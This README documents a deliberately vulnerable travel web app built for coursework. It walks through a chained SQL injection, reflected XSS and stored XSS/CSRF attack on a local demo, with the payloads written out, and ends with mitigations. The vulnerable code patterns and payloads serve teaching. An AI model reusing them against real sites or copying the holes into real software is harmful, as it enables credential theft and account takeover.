# Wanderly — Vulnerable Travel Platform (Cybersecurity Demonstration Project)

## 1. System Architecture Overview

```
+-------------------------------------------------------------------------+
|                           CLIENT SIDE (Browser)                         |
|   [React Engine] <---> [Bootstrap UI Components] <---> [Auth Provider] |
+-------------------------------------------------------------------------+
                                       ^
                                       | (Port 5173 /api/ Proxy)
                                       v
+-------------------------------------------------------------------------+
|                           SERVER SIDE (Node.js)                         |
|          [Express Routing Engine] <---> [Session Memory Store]          |
+-------------------------------------------------------------------------+
                                       ^
                                       | (Port 5432 Raw SQL Pipeline)
                                       v
+-------------------------------------------------------------------------+
|                         DATABASE TIER (PostgreSQL)                      |
|        [users]      [destinations]       [posts]       [comments]       |
+-------------------------------------------------------------------------+
```

---

## 2. Web Development Coursework Compliance Matrix

Per the specifications of the Web Development coursework, a group size of two students mandates a minimum layout threshold of **6 discrete application pages**.

### 2.1 Complete Page Manifest & Feature Matrix

| Page Name                   | Routed Path     | Target Functional Purpose                                                                                                                                                           | Form Handling / Input Validation Features                                                                                                                                    |
| :-------------------------- | :-------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Home Dashboard**          | `/`             | Responsive portal showcasing platform capabilities, key travel stats counters, core layout feature-grids, and dynamic customized welcome headers using current authenticated state. | None (Display & Application Navigation Portal).                                                                                                                              |
| **User Sign In**            | `/login`        | High-security layout containing user authentication interface. Connected directly to raw database match-checking.                                                                   | Single-state input forms. Captures emails and raw strings. Passwords match via state. Exposes native raw database errors directly to error-boxes upon query failures.        |
| **Account Creation**        | `/signup`       | System registration screen allowing generation of standard access user profiles with auto-assigned `user` tier roles.                                                               | Active client-side field validation: Enforces non-empty usernames, structurally validated emails, a minimum 6-character boundary for passwords, and structural match checks. |
| **Destinations Portal**     | `/destinations` | Travel catalog explorer. Interrogates database collection; outputs dynamic cards containing name, location, pricing, trip duration, and visual imagery assets.                      | Real-time text filter form processing queries against the database text fields via an on-submit handler. Displays string parameters directly back into the view.             |
| **Travel Blog**             | `/blog`         | Content delivery interface rendering multi-column editorial travel logs. Features deep-linking into individual articles with active user commenting capabilities.                   | Live text-area comment processing block. Validates string length presence before submitting via asynchronous fetch headers back to the server storage array.                 |
| **Profile & Control Panel** | `/profile`      | User account card showcasing profile identifiers. If accessed by an `admin` user, it updates dynamically into an administrative user control board.                                 | Interactive privilege management forms. Generates dynamic user list tables from the database and appends single-click target execution hooks to promote user tiers.          |

### 2.2 Core Web Requirements Execution

- **Responsive Fluidity:** The layout leverages Bootstrap's responsive grid system (`row`, `col-sm-6`, `col-md-4`), elastic container structures, and dynamic visibility flags to render across standard mobile devices, tablets, and full desktop displays.
- **Stateful Navigation:** A persistent `Navbar.jsx` component implements synchronized routing states via React Router's `NavLink`. The layout adjusts dynamically based on the real-time application context provided by `AuthContext.jsx`.
- **Input Validation Architecture:** Forms implement strict frontend validations (matching passwords, password length constraints, and presence checks) combined with backend verification checks to reject empty submissions or duplicate registration records.

---

## 3. Cybersecurity Coursework Specification: The Chained Attack Vector

The primary objective of the cybersecurity portion of this project is to implement, execute, and document a multi-layered, chained vulnerability path that escalates privileges from a standard user account to full administrative control.

```
+------------------------+      +------------------------+      +------------------------+
|  1. SQL INJECTION      |      |  2. REFLECTED XSS      |      |  3. STORED XSS + CSRF  |
|  - Reconnaissance Phase|      |  - Proof of Execution  |      |  - Privilege Change    |
|  - Extract Admin Email | ===> |  - Inject via URL Param| ===> |  - Plant Payload in DB |
|    & Password via UNION|      |  - Render via innerHTML|      |  - Fire Promote API    |
+------------------------+      +------------------------+      +------------------------+
                                                                          ||
                                                                          \/
                                                           +-------------------------------+
                                                           |      ATTACKER ESCALATION      |
                                                           |       Full Admin Access       |
                                                           +-------------------------------+
```

---

## 3.1 Chain Link 1: SQL Injection (Reconnaissance Phase)

**Vulnerable Endpoint:** `GET /api/destinations?search=`

**Underlying Exploit Mechanism:** The search input value is directly interpolated into a raw SQL command string in `server/index.js` without sanitization or parameterization:

```javascript
query = `SELECT * FROM destinations WHERE name ILIKE '%${search}%' OR country ILIKE '%${search}%'`;
```

**Exploitation Objective:** By injecting an unescaped single quote, an attacker breaks out of the `ILIKE` clause boundary. Appending a `UNION SELECT` command forces the database engine to append rows from the private `users` table directly into the destination results returned to the UI — exposing admin credentials in plaintext.

---

## 3.2 Chain Link 2: Reflected Cross-Site Scripting (Proof of Execution)

**Vulnerable Component:** `Destinations.jsx`

**Underlying Exploit Mechanism:** The application reads the raw `q` query parameter from the URL via React Router's `useSearchParams()`. Instead of rendering this as safe text, it is injected directly into the page layout via `dangerouslySetInnerHTML`:

```javascript
<span dangerouslySetInnerHTML={{ __html: search }} />
```

**Exploitation Objective:** A crafted URL causes arbitrary JavaScript to execute in any user's browser who visits the link. This confirms that the attacker has code execution in the browser context — a prerequisite for CSRF delivery.

---

## 3.3 Chain Link 3: Stored XSS → CSRF (Privilege Escalation Phase)

**Vulnerable Components:** `Blog.jsx` (Stored XSS sink) + `POST /api/promote/:userId` (CSRF target)

**Underlying Exploit Mechanism:** Blog post comments are stored raw in the database and rendered unsanitized via `dangerouslySetInnerHTML`:

```javascript
<div dangerouslySetInnerHTML={{ __html: c.body }} />
```

The promotion endpoint checks for an admin session but does **not** validate a CSRF token:

```javascript
app.post("/api/promote/:userId", requireAdmin, async (req, res) => {
  await pool.query("UPDATE users SET role=$1 WHERE id=$2", ["admin", userId]);
});
```

**Exploitation Objective:** The attacker plants a malicious comment containing a hidden `fetch()` call targeting `/api/promote/<attacker_id>`. When an admin opens the blog post to read it, the payload fires automatically — the browser silently sends the admin's session cookie with the promotion request, escalating the attacker to admin without any admin interaction beyond viewing the page.

---

# 4. Local Setup & Exploitation Walkthrough

## 4.1 Local Setup Prerequisites

### Step 1 — Create the PostgreSQL Database

```bash
createdb wanderly
```

Or create it manually via pgAdmin.

---

### Step 2 — Initialize Tables & Seed Data

```bash
psql -U postgres -d wanderly -f server/setup.sql
```

This creates the `users`, `destinations`, `posts`, and `comments` tables and seeds the admin account and sample data.

---

### Step 3 — Configure Environment Variables

Inside the `server` folder:

```bash
cp .env.example .env
```

Edit `.env`:

```env
DATABASE_URL=postgresql://postgres:YOUR_PASSWORD@localhost:5432/wanderly
SESSION_SECRET=supersecretkey
PORT=5000
```

---

### Step 4 — Start the Backend Server

```bash
cd server
npm install
npm start
```

Expected output:

```
Server running on http://localhost:5000
```

---

### Step 5 — Start the Frontend Client

Open a second terminal:

```bash
cd client
npm install
npm run dev
```

Expected output:

```
Local:   http://localhost:5173
```

---

## 4.2 Exploitation Execution Steps

### Step 1 — Create the Attacker Profile

1. Open an Incognito browser window and navigate to:

   ```
   http://localhost:5173/signup
   ```

2. Register with:

   | Field    | Value              |
   | -------- | ------------------ |
   | Username | hacker             |
   | Email    | hacker@exploit.com |
   | Password | hackme123          |

3. After signup, navigate to:

   ```
   http://localhost:5173/profile
   ```

4. Note your **User ID** displayed on the profile card (usually `2`). This is the target ID used in the CSRF payload.

---

### Step 2 — Execute SQL Injection (Reconnaissance)

1. Navigate to:

   ```
   http://localhost:5173/destinations
   ```

2. Paste this payload into the search box and click **Search**:
   ```
   nonexistent' UNION SELECT id, username, email, password, 0, role, 'https://placehold.co/400x200' FROM users--
   ```

**Successful Result Indicators:**

- Destination cards now display database user records instead of destinations.
- The admin email, plaintext password, and role are visible on the cards.

Expected card contents:

| Card Field (maps to)   | Value              |
| ---------------------- | ------------------ |
| Name (username)        | admin              |
| Country (email)        | admin@wanderly.com |
| Description (password) | admin123           |
| Duration (role)        | admin              |

---

### Step 3 — Execute Reflected XSS (Proof of Execution)

Paste this URL directly into the browser address bar:

```
http://localhost:5173/destinations?q=<img src=x onerror=alert(1)>
```

**Successful Result Indicators:**

- An alert box fires immediately when the page renders, confirming arbitrary JavaScript execution.
- The "Showing results for:" label reflects the injected payload.

> Note: `document.cookie` will be empty in the alert because the session cookie is flagged `httpOnly` — this is intentional server-side behaviour. The XSS execution itself is confirmed by the alert firing.

---

### Step 4 — Plant the Stored XSS + CSRF Payload (Blog)

1. Still logged in as the **attacker** account, navigate to:

   ```
   http://localhost:5173/blog
   ```

2. Open any blog post.

3. In the comment box, paste this payload — replacing `2` with your actual attacker User ID from Step 1:

   ```html
   <img
     src="x"
     onerror="fetch('/api/promote/2',{method:'POST',credentials:'include'})"
   />
   ```

4. Click **Post Comment**. The payload is now permanently stored in the database.

---

### Step 5 — Trigger CSRF via Admin Session

1. Open a **second browser** (or a new Incognito window — different from the attacker session).

2. Navigate to:

   ```
   http://localhost:5173/login
   ```

3. Log in using the admin credentials extracted via SQLi:

   | Field    | Value              |
   | -------- | ------------------ |
   | Email    | admin@wanderly.com |
   | Password | admin123           |

4. Navigate to:

   ```
   http://localhost:5173/blog
   ```

5. Open the same blog post where the attacker posted the comment.

6. The `<img onerror>` payload fires automatically — no click required. The browser silently sends:
   ```
   POST /api/promote/2
   Cookie: connect.sid=<admin_session>
   ```

---

### Step 6 — Verify Privilege Escalation

1. Return to the **attacker browser session**.

2. Navigate to:
   ```
   http://localhost:5173/profile
   ```

**Successful Result Indicators:**

- The role badge changes from `user` to **Admin**.
- The Admin Panel — User Management table becomes visible.
- The attacker account now has full administrator access.

---

# 5. Relational Database Schema Architecture

```
+------------------+          +------------------+
|      users       |          |   destinations   |
+------------------+          +------------------+
| id (PK, Serial)  |          | id (PK, Serial)  |
| username (Text)  |          | name (Text)      |
| email (Text, UQ) |          | country (Text)   |
| password (Text)  |          | description(Text)|
| role (Text)      |          | price (Int)      |
+------------------+          | duration (Text)  |
                              | image (Text)     |
                              +------------------+

+------------------+          +------------------+
|     comments     |          |      posts       |
+------------------+          +------------------+
| id (PK, Serial)  |          | id (PK, Serial)  |
| post_id (FK)     | -------> | title (Text)     |
| username (Text)  |          | excerpt (Text)   |
| body (Text)      |          | body (Text)      |
| created_at (TS)  |          | author (Text)    |
+------------------+          | image (Text)     |
                              | created_at (TS)  |
                              +------------------+
```

---

## 5.1 System Entities Reference

**`users`** — Stores usernames, email identities, plaintext passwords, and authorization role levels (`user`, `admin`).

**`destinations`** — Stores travel destination records, pricing, trip durations, and image assets.

**`posts`** — Feeds the travel blog interface with editorial content.

**`comments`** — Stores user comments linked to blog posts via `post_id REFERENCES posts(id) ON DELETE CASCADE`. The `body` column is stored raw with no sanitization — the primary Stored XSS vector.

---

# 6. Defense-in-Depth Mitigation Blueprints

```
ATTACK LAYER                    REMEDIATION
+-------------------------+     +-----------------------------------+
| SQL Injection Route     | ==> | Parameterized Queries             |
+-------------------------+     +-----------------------------------+
| Reflected XSS Render    | ==> | React JSX Text Escaping           |
+-------------------------+     +-----------------------------------+
| Stored XSS Comments     | ==> | DOMPurify Sanitization            |
+-------------------------+     +-----------------------------------+
| Cross-Site CSRF State   | ==> | Anti-CSRF Token Validation        |
+-------------------------+     +-----------------------------------+
| Plaintext Passwords     | ==> | bcrypt Password Hashing           |
+-------------------------+     +-----------------------------------+
```

## 6.1 SQL Injection Mitigation

**Vulnerable:**

```javascript
query = `SELECT * FROM destinations WHERE name ILIKE '%${search}%'`;
```

**Secure:**

```javascript
const result = await pool.query(
  "SELECT * FROM destinations WHERE name ILIKE $1 OR country ILIKE $1",
  [`%${search}%`],
);
```

## 6.2 Reflected XSS Mitigation

**Vulnerable:**

```javascript
<span dangerouslySetInnerHTML={{ __html: search }} />
```

**Secure:**

```jsx
<span>{search}</span>
```

React automatically escapes HTML entities when rendering via JSX — no additional library needed.

## 6.3 Stored XSS Mitigation

```javascript
import DOMPurify from "dompurify";

<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(c.body) }} />;
```

## 6.4 CSRF Mitigation

```javascript
app.post(
  "/api/promote/:userId",
  requireAdmin,
  verifyCsrfToken,
  async (req, res) => {
    // verifyCsrfToken checks a cryptographically random token in the request header
    // that cannot be forged by a cross-origin fetch call
  },
);
```

## 6.5 Password Hashing Mitigation

```javascript
const bcrypt = require("bcrypt");
const hashedPassword = await bcrypt.hash(password, 12);
```

---

# 7. Quick Reference Commands

### Initialize Database

```bash
psql -U postgres -d wanderly -f server/setup.sql
```

### Start Backend

```bash
cd server && npm install && npm start
```

### Start Frontend

```bash
cd client && npm install && npm run dev
```

### Git Controls

```bash
git branch                    # show current branch
git checkout simple-vulnerable # switch to vulnerable branch
git status && git log --oneline
```
